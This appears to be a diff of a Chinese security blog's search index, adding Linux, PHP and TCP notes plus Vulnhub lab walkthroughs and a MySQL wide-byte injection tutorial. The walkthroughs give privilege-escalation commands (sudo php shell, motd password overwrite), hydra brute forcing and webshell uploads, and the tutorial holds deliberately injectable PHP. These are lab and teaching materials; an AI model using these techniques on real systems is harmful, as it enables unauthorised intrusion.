@@ -78,6 +78,35 @@
       </tags>
   </entry>
   <entry>
+    <title>Linux日志基础</title>
+    <url>/2021/08/28/Linux%E6%97%A5%E5%BF%97%E5%9F%BA%E7%A1%80/</url>
+    <content><![CDATA[<p>Linux日志基础</p>
+<p>2021年8月28日</p>
+<p>17:36</p>
+<span id="more"></span>
+
+<h2 id="网络信息查看与配置"><a href="#网络信息查看与配置" class="headerlink" title="网络信息查看与配置"></a><strong>网络信息查看与配置</strong></h2><h3 id="临时配置"><a href="#临时配置" class="headerlink" title="临时配置"></a><strong>临时配置</strong></h3><p>ip addr 确认系统网卡信息</p>
+<p>service NetworkManager stop 关闭networkmanager服务</p>
+<p>ip addr add 10.1.1.101/24 dev eth0 暂时配置网络地址</p>
+<p>ip route addr default via 10.1.1.1 dev eth0 暂时配置网关</p>
+<h2 id="日志管理"><a href="#日志管理" class="headerlink" title="日志管理"></a><strong>日志管理</strong></h2><p>目录</p>
+<p>/var/log</p>
+<h3 id="日志分类"><a href="#日志分类" class="headerlink" title="日志分类"></a><strong>日志分类</strong></h3><p>系统日志</p>
+<p>登录日志         secure</p>
+<p>程序日志</p>
+<h3 id="日志服务配置文件"><a href="#日志服务配置文件" class="headerlink" title="日志服务配置文件"></a><strong>日志服务配置文件</strong></h3><p>/etc/rsyslog.conf</p>
+<p>*.info;mail.none;authpriv.none;cron.none /var/log/messages</p>
+<p>a.b</p>
+<p>a:表示日历内容 , b:表示日志级别   /xx/x表示记录位置</p>
+<h3 id="日志异地备份"><a href="#日志异地备份" class="headerlink" title="日志异地备份"></a><strong>日志异地备份</strong></h3>]]></content>
+      <categories>
+        <category>操作系统</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Linux帐户安全</title>
     <url>/2021/08/26/Linux%E5%B8%90%E6%88%B7%E5%AE%89%E5%85%A8/</url>
     <content><![CDATA[<p>Linux帐号安全</p>
@@ -161,35 +190,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Linux日志基础</title>
-    <url>/2021/08/28/Linux%E6%97%A5%E5%BF%97%E5%9F%BA%E7%A1%80/</url>
-    <content><![CDATA[<p>Linux日志基础</p>
-<p>2021年8月28日</p>
-<p>17:36</p>
-<span id="more"></span>
-
-<h2 id="网络信息查看与配置"><a href="#网络信息查看与配置" class="headerlink" title="网络信息查看与配置"></a><strong>网络信息查看与配置</strong></h2><h3 id="临时配置"><a href="#临时配置" class="headerlink" title="临时配置"></a><strong>临时配置</strong></h3><p>ip addr 确认系统网卡信息</p>
-<p>service NetworkManager stop 关闭networkmanager服务</p>
-<p>ip addr add 10.1.1.101/24 dev eth0 暂时配置网络地址</p>
-<p>ip route addr default via 10.1.1.1 dev eth0 暂时配置网关</p>
-<h2 id="日志管理"><a href="#日志管理" class="headerlink" title="日志管理"></a><strong>日志管理</strong></h2><p>目录</p>
-<p>/var/log</p>
-<h3 id="日志分类"><a href="#日志分类" class="headerlink" title="日志分类"></a><strong>日志分类</strong></h3><p>系统日志</p>
-<p>登录日志         secure</p>
-<p>程序日志</p>
-<h3 id="日志服务配置文件"><a href="#日志服务配置文件" class="headerlink" title="日志服务配置文件"></a><strong>日志服务配置文件</strong></h3><p>/etc/rsyslog.conf</p>
-<p>*.info;mail.none;authpriv.none;cron.none /var/log/messages</p>
-<p>a.b</p>
-<p>a:表示日历内容 , b:表示日志级别   /xx/x表示记录位置</p>
-<h3 id="日志异地备份"><a href="#日志异地备份" class="headerlink" title="日志异地备份"></a><strong>日志异地备份</strong></h3>]]></content>
-      <categories>
-        <category>操作系统</category>
-      </categories>
-      <tags>
-        <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Linux软件安装</title>
     <url>/2021/08/26/Linux%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85/</url>
     <content><![CDATA[<p>Linux软件安装</p>
@@ -244,6 +244,160 @@
       </categories>
       <tags>
         <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Me-and-My-girlfriend-1靶机</title>
+    <url>/2021/08/31/Me-and-My-girlfriend-1%E9%9D%B6%E6%9C%BA/</url>
+    <content><![CDATA[<h3 id="靶场简介"><a href="#靶场简介" class="headerlink" title="靶场简介"></a>靶场简介</h3><p>下载地址：<a href="https://www.vulnhub.com/entry/me-and-my-girlfriend-1,409/">ME AND MY GIRLFRIEND: 1</a><br>目标:取得两个flag</p>
+<span id="more"></span>
+<p>用户:alice</p>
+<h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><p>VM2015<br>网上都是说选择NAT模式，尝试了一下在VM中选择VM1网段，但是用namp扫描不到。在虚拟机编辑选项里选择<strong>虚拟网络编辑器</strong>手动修改为启用DHCP，且将子网地址修改为与真实机相同网段后重启,再跑nmap就扫描到了。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20210831222907.png" alt="虚拟机网络配置修改"></p>
+<h3 id="正题"><a href="#正题" class="headerlink" title="正题"></a>正题</h3><p>先用nmap跑10.1.1网段，发现10.1.1.128开启22 和 80端口。明显一个网页服务一个SSH。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20210831223129.png" alt="nmap扫描结果"><br>访问80端口显示仅由local本地地址可以进入。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20210831223309.png" alt="网页结果"><br>查看源码后出现&lt;!– Maybe you can search how to use x-forwarded-for –&gt;提示。<br>搜了一下x-forwarded-for是记录最初的客户端ip以及后续代理ip。<br>语法:X-Forwarded-For: <client>, <proxy1>, <proxy2><br>很明显是通过伪造X-Forwarded-For为本地ip访问网站。<br>通过firefox Hackbar插件添加请求头 x-forwarded-for: 127.0.0.1，后即可正常访问。<br>进入网页后注册帐号，在profil页面发现通过GET方式user_id = 12，获得个人信息，尝试改变user_id是否可能获得其他人的帐号信息。<br>当我们输入id = 5时，用户名为alice,但是在密码页面无法直接看到，直接F12查看元素获得密码为:4lic3<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20210831224349.png" alt="密码"></p>
+<p>用alice和 4lic3ssh连接，在/home/alice下存在隐藏文件._secret，进入文件夹后获得flag1.txt，然后通过命令sudo -l 发现 可以不使用密码 通过root权限使用php。<br>sudo php - r 使用root权限执行php命令，构造任意命令执行获得root权限.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo php -r <span class="string">&quot;system(&#x27;/bin/bash&#x27;);&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#在 root 下搜索flag</span></span><br><span class="line"></span><br><span class="line">find / -name <span class="string">&quot;flag*.txt&quot;</span></span><br><span class="line"><span class="comment">#获得两个flag</span></span><br><span class="line">/root/flag2.txt</span><br><span class="line">/home/alice/.my_secret/flag1.txt</span><br></pre></td></tr></table></figure>
+
+
+]]></content>
+      <categories>
+        <category>靶场</category>
+      </categories>
+      <tags>
+        <tag>靶场</tag>
+        <tag>Vulnhub</tag>
+        <tag>Linux提权</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>NARAK靶机</title>
+    <url>/2021/12/12/NARAK%E9%9D%B6%E6%9C%BA/</url>
+    <content><![CDATA[<h1 id="靶场简介"><a href="#靶场简介" class="headerlink" title="靶场简介"></a>靶场简介</h1><p>靶机地址：<a href="https://www.vulnhub.com/entry/ha-narak,569/">NARAK</a><br>目标:user.txt , root.txt</p>
+<span id="more"></span>
+
+
+<h1 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h1><p>使用namp 扫描10.1.1.0/24网段，发现靶机地址为10.1.1.129。<br>开放22端口和80端口。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211212160132.png" alt="靶机扫描"><br>进入网页后发现，都是图片没有什么有用的信息。<br>使用dirb扫描靶机后发现存在三个目录<br><code>dirb http://10.1.1.129</code></p>
+<ul>
+<li>/index.html</li>
+<li>/server-startus</li>
+<li>/webdav</li>
+</ul>
+<p>index为主页，server-startus没有足够的权限，webdav需要帐号密码才能够查看。目前来看唯一可行的只有通过webdav进入。<br>使用cewl 对index网页进行爬虫，得到可能的密码字典，然后使用hydra进行爆破尝试.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cewl -w password.txt http://10.1.1.129</span><br><span class="line">hydra -L password.txt -P password.txt 10.1.1.129 http-get /webdav</span><br></pre></td></tr></table></figure>
+
+<p>得到 yamdoot:Swarg账户。尝试之后无法使用ssh登录。使用cadaver 连接webdav,然后put一个webshell进去。反弹shell后，使用<code>python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code>得到一个交互式bash窗口。  </p>
+<p>但是我们只有www-data权限，到home后我们得到了 inferno narak yamdoot 三个用户，试试用之前的密码连接全部失败了.又尝试进入mnt中发现有一个hell.sh文件，其中的内容为<br>    echo”Highway to Hell”;<br>    –[—–&gt;+&lt;]&gt;—.+++++.+.+++++++++++.–.+++[-&gt;+++&lt;]&gt;++.++++++.–[—&gt;+&lt;]&gt;–.—–.++++.</p>
+<p>其中的信息使用了brainfuck进行加密，到<a href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a> 进解码后，得到了 <strong>chitragupt</strong> 。<br>再次尝试使用三个帐号登录，这一次inferno帐号登录成功我们在home中得到了user.txt.很明显root.txt需要提权后得到。<br>使用motc提权</p>
+<ol>
+<li>进入文件夹 /etc/update-motd.d/</li>
+<li>修改文件 echo “echo ‘root:admin2’|sudo chpasswd” &gt;&gt; 00-header</li>
+<li>重新登录</li>
+<li>su root 密码为admin</li>
+</ol>
+<p>其中00-header文件的执行权限为root，但是我们可以对它进行修改意味着当文件执行时可以用root权限运行。00-header文件相当于登录的欢迎文件，当我们重新登录时 附加进的 echo ‘root:admin’|sudo chpasswd相当于使用root权限进行 chpasswd命令，而 | 前的相当于指令的输入，因此root的密码被修改为admin。从而获得root权限<br>在root文件夹中获得root.txt。</p>
+<hr>
+]]></content>
+      <categories>
+        <category>靶场</category>
+      </categories>
+      <tags>
+        <tag>靶场</tag>
+        <tag>Vulnhub</tag>
+        <tag>Linux提权</tag>
+        <tag>爬虫字典</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PHP核心配置</title>
+    <url>/2021/09/04/PHP%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/</url>
+    <content><![CDATA[<p>PHP核心配置</p>
+<span id="more"></span>
+
+<p>2021年7月13日</p>
+<p>10:58</p>
+<ul>
+<li>配置的可修改范围</li>
+</ul>
+<p>PHP_INI_USER        可在用户脚本（例如 ini_set()）或 Windows 注册表（自 PHP 5.3 起）以及 .user.ini 中设定 </p>
+<p>PHP_INI_PERDIR        可在 php.ini，.htaccess 或 httpd.conf 中设定</p>
+<p>PHP_INI_SYSTEM        可在 php.ini 或 httpd.conf 中设定</p>
+<p>PHP_INI_ALL        可在任何地方设定</p>
+<p>php.ini only    仅在php.ini中设置</p>
+<ul>
+<li>核心配置选项<ul>
+<li>register_globals</li>
+</ul>
+</li>
+</ul>
+<p>说明:该选项在on情况下，会将用户GET,POST提交上的参数自动注册为全局变量，并且初始化为对应的值。</p>
+<p>版本变换:PHP &lt;= 4.2.3范围为PHP_INI_ALL, 在PHP5.3.0开始默认关闭 ， PHP 5.4.0移除该选项。</p>
+<p>例子:</p>
+<?php
+
+if($user=admin)
+
+echo 123;
+
+?>
+
+<p>xx.php?user=admin运行时会输出123</p>
+<ul>
+<li>allow_url_include</li>
+</ul>
+<p>说明:开启情况下，运行包含远程文件.</p>
+<p>版本变化: PHP 5.2.0后默认关闭</p>
+<ul>
+<li>magic_quotes_gpc</li>
+</ul>
+<p>说明:开启后会在GET , POST, COOKIE 变量中 ‘ “  \ null 字符前加入,但是并不会过滤$_SERVER变量。</p>
+<p>版本变化:PHP 5.3后默认关闭 , 5.4之后取消 ， 在&lt;=4.2.3时,配置范围为 PHP_INI_ALL</p>
+<ul>
+<li>magic_quotes_runtime</li>
+</ul>
+<p>说明:与_gpc相同，只不过只对文件和数据库中获取的数据转义。</p>
+<p>版本变化:5.4后取消</p>
+<p>特点:只有部分函数受影响</p>
+<ul>
+<li>magic_quotes_sybase</li>
+</ul>
+<p>说明:会将GET,POST, Cookie的传递的单引号(‘)变为(“)，并转义null字符.</p>
+<p>配置范围: PHP_INI_ALL</p>
+<p>版本: 5.4.0后移除</p>
+<p>特点:当开启后会覆盖_gpc = on;</p>
+<ul>
+<li>safe_mode(安全模式)</li>
+</ul>
+<p>配置范围:PHP_INI_SYSTEM</p>
+<p>版本: 5.4.0之后被取消</p>
+<p>说明:</p>
+<ul>
+<li><p>所有文件操作会受限制</p>
+</li>
+<li><p>popen(), system(), exec()等命令执行函数会受限制</p>
+</li>
+<li><p>open_basedir</p>
+</li>
+</ul>
+<p>说明:限制PHP可以访问的目录</p>
+<p>配置范围:&lt;2.2.3 PHP_INI_SYSTEM ，  &gt;= 5.2.3 PHP_INI_ALL</p>
+<p>特点:对于目录要以/闭合，如 open_basedir = www/a,那么可以访问www/a 和www/b。</p>
+<p>因此合理的写法为www/a/</p>
+<ul>
+<li>diable_functions</li>
+</ul>
+<p>说明:禁止php函数应用</p>
+<p>范围:php.ini</p>
+<ul>
+<li>display_errors  , error_reporting</li>
+</ul>
+<p>说明:关闭 _errors关闭会取消错误显示，当开启时配合_reporting可以控制错误显示级别.</p>
+<p>配置范围:PHP_INI_ALL</p>
+]]></content>
+      <categories>
+        <category>代码审计</category>
+      </categories>
+      <tags>
+        <tag>PHP</tag>
+        <tag>代码审计</tag>
       </tags>
   </entry>
   <entry>
@@ -337,6 +491,73 @@
       </tags>
   </entry>
   <entry>
+    <title>Tcp_ip协议 12.2TCP的引入</title>
+    <url>/2021/09/03/Tcp_ip%E5%8D%8F%E8%AE%AE%2012.2TCP%E7%9A%84%E5%BC%95%E5%85%A5/</url>
+    <content><![CDATA[<p>12.2 TCP的引入</p>
+<span id="more"></span>
+
+<p>2021年9月3日</p>
+<p>21:05</p>
+<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20210903213842.png" alt="TCP头部在数据包中封装"></p>
+<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20210903213934.png" alt="TCP头部信息"></p>
+<ul>
+<li>TCP头部包含源端口和目标端口。端口和IP唯一标识了每个TCP连接，端口IP的组合有时被称为socket。   4字节</li>
+<li>序列号标记了这一段信息中第一个字节的编号 4字节</li>
+<li>ACK(确认号)为最后接收到的字节的序列号+1.  4字节</li>
+<li>头部长度以32位字(4字节)为单位确定4位标识位，TCP头部最多带60字节头部.   头部长度加上保留 共 1字节</li>
+<li>8种状态位     1字节</li>
+<li>窗口大小      2字节</li>
+<li>TCP校验      2字节</li>
+<li>紧急指针      2字节 //仅在URG字段设置时有效</li>
+</ul>
+<ol>
+<li>SYN状态位，在建立连接时使用</li>
+<li>FIN状态位, 当关闭连接时使用</li>
+</ol>
+]]></content>
+      <categories>
+        <category>网络</category>
+      </categories>
+      <tags>
+        <tag>网络</tag>
+        <tag>tcp/ip</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Tcp_ip协议 13.2连接的建立和终止</title>
+    <url>/2021/09/06/Tcp_ip%E5%8D%8F%E8%AE%AE%2013.2%E8%BF%9E%E6%8E%A5%E7%9A%84%E5%BB%BA%E7%AB%8B%E5%92%8C%E7%BB%88%E6%AD%A2/</url>
+    <content><![CDATA[<h1 id="13-2-TCP-IP连接的建立和终止"><a href="#13-2-TCP-IP连接的建立和终止" class="headerlink" title="13.2 TCP_IP连接的建立和终止"></a>13.2 TCP_IP连接的建立和终止</h1><span id="more"></span>
+
+<h2 id="连接建立"><a href="#连接建立" class="headerlink" title="连接建立"></a>连接建立</h2><p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20210906220930.png" alt="建立连接"></p>
+<ol>
+<li>主动开启者发送报文，包含初始序列号ISN_c,SYN位表示想要建立TCP连接</li>
+<li>服务器SYN报文seq = $INS_x$, ACK=$INS_c$+1，表示服务器确认建立连接。此时<strong>服务器</strong>知道<strong>服务器接受</strong>功能无问题、<strong>客户端发送</strong>无问题</li>
+<li>客户端发送ACK报文，seq = $INS_c+1$, ACK = $INS_x+1$。当客户端接受到2号报文时，<strong>客户端</strong>确认<strong>双方发送接受</strong>均无问题。当<strong>服务端</strong>接受到报文3时确认<strong>服务端发送客户端接受</strong>无问题。</li>
+</ol>
+<h2 id="连接关闭"><a href="#连接关闭" class="headerlink" title="连接关闭"></a>连接关闭</h2><p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20210906221028.png" alt="连接关闭"></p>
+<ol>
+<li>主动开启者发送    Fin段以及$Seq = k, ACK = L$。表示想要关闭连接。</li>
+<li>被动开启者发送 $Seq = L, ACK = k+1$，表示接收到关闭帧。</li>
+<li>如果有数据还需要发送，进行剩余的数据发送</li>
+<li>被动开启者发送$Fin Seq = L , ACK = k+1$，表示关闭连接。</li>
+<li>主动开启者发送$Seq = k+1，  ACK = L+1 $，接收到被动方的连接关闭。</li>
+</ol>
+<h2 id="TCP半关闭"><a href="#TCP半关闭" class="headerlink" title="TCP半关闭"></a>TCP半关闭</h2><p>含义：半关闭表示为一方发送Fin连接表示我已经发送了所有我应该发送的数据，但是我仍然希望接收对方发送的数据直到对方发送Fin连接。表示对方数据同样发送完毕。</p>
+<p>整体流程与TCP关闭相同不过在第三步会发送更多的数据。</p>
+<h2 id="同时打开与同时关闭"><a href="#同时打开与同时关闭" class="headerlink" title="同时打开与同时关闭"></a>同时打开与同时关闭</h2><p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20210906221113.png"></p>
+<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20210906221145.png"></p>
+<p>当双方同时向对方发送清求连接或者请求关闭连接时，会发生这种情况。此时无论建立连接或者关闭连接都会发送4个报文。</p>
+<h2 id="连接建立超时"><a href="#连接建立超时" class="headerlink" title="连接建立超时"></a>连接建立超时</h2><p>当向无法回复的服务器请求建立连接时，客户端会不断向服务器发送SYN报文。时间上采取<strong>指数回退</strong>。第二次发送报文3秒后，第三次在上一个报文发送6秒后，第四次在上一次发送12秒后。以此类推，同时可以控制尝试发送SYN连接报文的最多次数。</p>
+]]></content>
+      <categories>
+        <category>网络</category>
+      </categories>
+      <tags>
+        <tag>网络</tag>
+        <tag>tcp/ip</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>WEB服务配置</title>
     <url>/2021/08/29/WEB%E6%9C%8D%E5%8A%A1%E9%85%8D%E7%BD%AE/</url>
     <content><![CDATA[<p>WEB服务配置</p>
@@ -412,17 +633,21 @@
       </tags>
   </entry>
   <entry>
-    <title>Me-and-My-girlfriend-1靶机</title>
-    <url>/2021/08/31/Me-and-My-girlfriend-1%E9%9D%B6%E6%9C%BA/</url>
-    <content><![CDATA[<h3 id="靶场简介"><a href="#靶场简介" class="headerlink" title="靶场简介"></a>靶场简介</h3><p>下载地址：<a href="https://www.vulnhub.com/entry/me-and-my-girlfriend-1,409/">ME AND MY GIRLFRIEND: 1</a><br>目标:取得两个flag</p>
+    <title>lazysysadmin靶机</title>
+    <url>/2021/12/14/lazysysadmin%E9%9D%B6%E6%9C%BA/</url>
+    <content><![CDATA[<h2 id="靶机简介"><a href="#靶机简介" class="headerlink" title="靶机简介"></a>靶机简介</h2><p>下载地址:   <a href="https://www.vulnhub.com/entry/lazysysadmin-1,205/">LAZYSYSADMIN</a> </p>
 <span id="more"></span>
-<p>用户:alice</p>
-<h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><p>VM2015<br>网上都是说选择NAT模式，尝试了一下在VM中选择VM1网段，但是用namp扫描不到。在虚拟机编辑选项里选择<strong>虚拟网络编辑器</strong>手动修改为启用DHCP，且将子网地址修改为与真实机相同网段后重启,再跑nmap就扫描到了。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20210831222907.png" alt="虚拟机网络配置修改"></p>
-<h3 id="正题"><a href="#正题" class="headerlink" title="正题"></a>正题</h3><p>先用nmap跑10.1.1网段，发现10.1.1.128开启22 和 80端口。明显一个网页服务一个SSH。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20210831223129.png" alt="nmap扫描结果"><br>访问80端口显示仅由local本地地址可以进入。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20210831223309.png" alt="网页结果"><br>查看源码后出现&lt;!– Maybe you can search how to use x-forwarded-for –&gt;提示。<br>搜了一下x-forwarded-for是记录最初的客户端ip以及后续代理ip。<br>语法:X-Forwarded-For: <client>, <proxy1>, <proxy2><br>很明显是通过伪造X-Forwarded-For为本地ip访问网站。<br>通过firefox Hackbar插件添加请求头 x-forwarded-for: 127.0.0.1，后即可正常访问。<br>进入网页后注册帐号，在profil页面发现通过GET方式user_id = 12，获得个人信息，尝试改变user_id是否可能获得其他人的帐号信息。<br>当我们输入id = 5时，用户名为alice,但是在密码页面无法直接看到，直接F12查看元素获得密码为:4lic3<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20210831224349.png" alt="密码"></p>
-<p>用alice和 4lic3ssh连接，在/home/alice下存在隐藏文件._secret，进入文件夹后获得flag1.txt，然后通过命令sudo -l 发现 可以不使用密码 通过root权限使用php。<br>sudo php - r 使用root权限执行php命令，构造任意命令执行获得root权限.</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo php -r <span class="string">&quot;system(&#x27;/bin/bash&#x27;);&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#在 root 下搜索flag</span></span><br><span class="line"></span><br><span class="line">find / -name <span class="string">&quot;flag*.txt&quot;</span></span><br><span class="line"><span class="comment">#获得两个flag</span></span><br><span class="line">/root/flag2.txt</span><br><span class="line">/home/alice/.my_secret/flag1.txt</span><br></pre></td></tr></table></figure>
 
-
+<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>扫描网段，发现靶机ip地址，而且开放了 22  80 139 445 3306 6667 端口。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211214092751.png" alt="扫描结果">   </p>
+<p>首先查看445端口有那些共享文件。使用enum4linux扫描共享文件信息。  </p>
+<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211214093329.png" alt="扫描结果"></p>
+<p>通过扫描结果，可以使用空用户名和密码登录。共享文件信息有print$ , share$  , ipc$ .<br>通过\10.1.1.131\share$访问后。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211214093503.png" alt="共享文件内容"><br>打开deet.txt文件后，获得密码<strong>12345</strong>,同时访问wordpress配置文件获得了数据库用户名<strong>Admin</strong>,密码<strong>TogieMYSQL12345^^</strong><br>访问wordpress后在首页得到用户名<strong>togie</strong>，尝试通过wordpress对靶机进行渗透。  </p>
+<ol>
+<li>进入wordpress/wp-admin，尝试使用mysql帐号密码进入</li>
+<li>在Appearance中的editor修改404页面，写入shell<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211214100216.png" alt="修改404页面"></li>
+<li> 进入404页面 /wordpress/wp-content/themes/twentyfifteen/404.php，获得shell</li>
+</ol>
+<p>反弹shell后，进入home页面发现用户togie，使用share$中的密码12345登录成功。sudo -L查看权限，用户拥有all:all权限，使用sudo su获得root权限。</p>
 ]]></content>
       <categories>
         <category>靶场</category>
@@ -430,7 +655,84 @@
       <tags>
         <tag>靶场</tag>
         <tag>Vulnhub</tag>
-        <tag>Linux提权</tag>
+        <tag>wordpress</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>msyql宽字节注入</title>
+    <url>/2021/09/16/msyql%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h1 id="mysql宽字节注入"><a href="#mysql宽字节注入" class="headerlink" title="mysql宽字节注入"></a>mysql宽字节注入</h1><span id="more"></span>
+
+<p>  #宽字节注入</p>
+<p>  在注入过程中，如果采用magic_quot_gpc 或者 addslashes()。如果采用’注入会产生&#39;。导致无法绕过’’。当采用客户端采用 SET names = GBK 或者 mysqli_set_charset($conn, ‘gbk’)时，相当于设置 </p>
+  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary</span><br></pre></td></tr></table></figure>
+
+<p>此时转义字符\被URL编码解析为 %5c 如果我们手动输入 %df’。经过浏览器编码和转义后会成为 %df%5c%27。在[[msyql数据编码]]的设置下,%df%5c 连接在一起会被解析为GBK双字节编码,此时%df\会变为一个汉字。因此我们便绕过了\转义符,实现了在mysql语句中直接插入’的目的。在绕过的过程中%df不固定，只要可以与%5c一起构成GBK编码都可以绕过\转义符。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//echo 12341234;</span><br><span class="line"></span><br><span class="line">	function unicode($res)</span><br><span class="line">	&#123;</span><br><span class="line">		//echo 1234;</span><br><span class="line">		 //print&quot;12421&quot;;</span><br><span class="line">			 while($val=mysqli_fetch_row($res))&#123;</span><br><span class="line">   			 print&quot;&#123;$val[0]&#125; = &#123;$val[1]&#125;&quot;;</span><br><span class="line">   			  print(&quot;&lt;br&gt;&quot;);</span><br><span class="line">			 &#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	//echo 1234555;</span><br><span class="line">	header(&quot;Content-Type:text/html;charset=gbk&quot;); //为了显示，将页面默认为gbk</span><br><span class="line">	$name=$_GET[&#x27;name&#x27;];</span><br><span class="line">		echo $name;</span><br><span class="line">	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">	$conn = mysqli_connect(&#x27;127.0.0.1&#x27;,&#x27;root&#x27;,&#x27;root&#x27;);  </span><br><span class="line">	mysqli_select_db($conn,&#x27;xnfh&#x27;);</span><br><span class="line">	</span><br><span class="line">	print&quot;****************&lt;br&gt;AT Start &lt;br&gt;&quot;;</span><br><span class="line">	</span><br><span class="line">	$result=mysqli_query($conn,&quot;show variables like &#x27;character\_set\_%&#x27;;&quot;);</span><br><span class="line">	unicode($result);</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	//mysqli_set_charset($conn, &#x27;gbk&#x27;);</span><br><span class="line">	//mysqli_query($conn,&quot;set names &#x27;gbk&#x27;&quot;);</span><br><span class="line">	mysqli_query($conn, &quot;SET character_set_connection=gbk, character_set_client=gbk&quot;);</span><br><span class="line">	print&quot;*********************** &lt;br&gt;charset gbk &lt;br&gt;&quot;;</span><br><span class="line">		$result=mysqli_query($conn,&quot;show variables like &#x27;character\_set\_%&#x27;;&quot;);</span><br><span class="line">	unicode($result);</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">		mysqli_query($conn, &quot;SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary&quot;);</span><br><span class="line">		print&quot;*********************** &lt;br&gt;charset gbk and protect &lt;br&gt;&quot;;</span><br><span class="line">		$result=mysqli_query($conn,&quot;show variables like &#x27;character\_set\_%&#x27;;&quot;);</span><br><span class="line">	unicode($result);</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	//$name = mysqli_real_escape_string($conn, $name);</span><br><span class="line">	$name =addslashes($name);</span><br><span class="line">	//echo 1234;</span><br><span class="line">	//mysqli_query($conn,&quot;character_set_client=binary&quot;);</span><br><span class="line">	</span><br><span class="line">	//mysqli_query($conn,&quot;SET character_set_connection=gbk,character_set_client=binary&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	echo $name;</span><br><span class="line">	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">	//mysqli_query($conn,&quot;SET NAMES &#x27;gbk&#x27;&quot;);</span><br><span class="line">	if($conn==null)&#123;exit(&quot;connect error !&lt;br&gt;&quot;);&#125;</span><br><span class="line">	$sql=&quot;select * from users where id=&#x27;&quot;.$name.&quot;&#x27;&quot;;</span><br><span class="line">	$result2=mysqli_query($conn,$sql);</span><br><span class="line">	unicode($result2);</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	echo $sql;</span><br><span class="line">	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">	//echo 1234;</span><br><span class="line">	unicode($result);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>经过实验代码我们发现，直接设置 SET NAMES gbk 与  mysqli_set_charset 在直接结果上都是相同的 ,都只改变3项为gbk.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AT Start</span><br><span class="line"></span><br><span class="line">character_set_client = utf8</span><br><span class="line">character_set_connection = utf8</span><br><span class="line">character_set_database = utf8</span><br><span class="line">character_set_filesystem = binary</span><br><span class="line">character_set_results = utf8</span><br><span class="line">character_set_server = utf8</span><br><span class="line">character_set_system = utf8</span><br><span class="line">***********************</span><br><span class="line">After charset gbk</span><br><span class="line"></span><br><span class="line">character_set_client = gbk		//改变</span><br><span class="line">character_set_connection = gbk	//改变</span><br><span class="line">character_set_database = utf8</span><br><span class="line">character_set_filesystem = binary</span><br><span class="line">character_set_results = gbk	//改变</span><br><span class="line">character_set_server = utf8</span><br><span class="line">character_set_system = utf8</span><br></pre></td></tr></table></figure>
+
+<p>防御方法 </p>
+<ol>
+<li><p>通过mysqli_set_charset 与 mysql_real_escape_string()转义达到效果，放弃add….()函数。</p>
+<pre><code>通过mysqli_set_charse设置字符集之后，使用real_escape()函数会根据对应设置的字符集进行相应的转义，虽然字符集设计没有改变，但是无法绕过\转义符.
+</code></pre>
